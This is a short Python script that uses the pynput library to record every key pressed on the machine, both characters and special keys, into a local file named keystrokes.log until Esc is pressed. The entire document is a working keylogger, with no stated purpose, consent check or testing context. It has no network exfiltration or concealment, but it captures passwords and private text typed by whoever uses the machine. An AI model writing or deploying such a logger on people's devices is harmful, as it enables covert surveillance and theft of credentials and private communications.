from pynput import keyboard

# Define the file where the log will be saved
log_file = "keystrokes.log"

# Function to log the keys
def on_press(key):
    try:
        # Log regular keys
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Log special keys (like Enter, Space, etc.)
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

# Stop listener on a specific key press (e.g., Esc)
def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener

# Start listening to the keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
